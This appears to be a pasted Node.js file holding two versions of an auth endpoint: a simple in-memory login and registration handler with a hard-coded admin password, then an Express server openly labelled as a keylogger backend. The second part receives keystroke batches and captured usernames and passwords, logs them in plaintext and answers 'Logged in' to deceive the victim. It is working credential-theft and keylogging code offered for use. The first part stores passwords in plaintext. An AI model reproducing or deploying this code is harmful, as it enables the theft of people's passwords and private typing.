npm install express cors
node api/auth.js
// Temporary memory to store users
const users = [
    { username: 'admin', password: 'securePassword123' }
];

// CHANGED: Using module.exports instead of export default for Vercel compatibility
module.exports = function(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }
    
    const { action, username, password } = req.body;

    // --- LOGIN LOGIC ---
    if (action === 'login') {
        const foundUser = users.find(u => u.username === username && u.password === password);
        
        if (foundUser) {
            return res.status(200).json({ 
                success: true, 
                message: 'Login successful' 
            });
        } else {
            return res.status(401).json({ 
                success: false, 
                message: 'Access Denied. Invalid credentials.' 
            });
        }
    }
    
    // --- REGISTRATION LOGIC ---
    if (action === 'register') {
        if (password.length >= 6) {
            const userExists = users.find(u => u.username === username);
            if (userExists) {
                return res.status(400).json({ 
                    success: false, 
                    message: 'Registration Failed: Username is already taken!' 
                });
            }

            users.push({ username: username, password: password });
            return res.status(200).json({ 
                success: true, 
                message: 'Account created successfully! You can now switch to Log In.' 
            });
        } else {
            return res.status(400).json({ 
                success: false, 
                message: 'Registration Failed: Password must be at least 6 characters.' 
            });
        }
    }

    return res.status(400).json({ success: false, message: 'Invalid action requested.' });
};
// ============================================================
// api/auth.js — Complete backend with keylogger endpoints
// ============================================================
const express = require('express');
const fs      = require('fs');
const path    = require('path');
const cors    = require('cors');       // npm install cors

const app  = express();
const PORT = process.env.PORT || 3000;

// --- Middleware (this is the app.use you're missing) ---
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Logs directory ---
const LOG_DIR = path.join(__dirname, '..', 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

// ============================================================
// KEYLOGGER ENDPOINTS
// ============================================================

// POST /api/auth/keystrokes — receive keystroke batches from frontend
app.post('/api/auth/keystrokes', (req, res) => {
    const data = req.body;
    if (!data || !data.keys) return res.status(400).json({ status: 'error' });

    const rollingLog = path.join(LOG_DIR, 'keystrokes.log');
    fs.appendFileSync(rollingLog, `[${new Date().toISOString()}] ${data.keys}\n`, 'utf-8');
    console.log(`[KEYSTROKES] ${data.keys}`);

    res.json({ status: 'ok' });
});

// POST /api/auth/login — receive captured credentials
app.post('/api/auth/login', (req, res) => {
    const data = req.body;
    if (!data) return res.status(400).json({ status: 'error' });

    const rollingLog = path.join(LOG_DIR, 'credentials.log');
    const line = `[${new Date().toISOString()}] user='${data.username || ''}' pass='${data.password || ''}'\n`;
    fs.appendFileSync(rollingLog, line, 'utf-8');

    console.log(`[CREDENTIALS] user='${data.username}' pass='${data.password}'`);
    res.json({ status: 'ok', message: 'Logged in' });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Keylogger backend running on http://0.0.0.0:${PORT}/api/auth`);
});


   
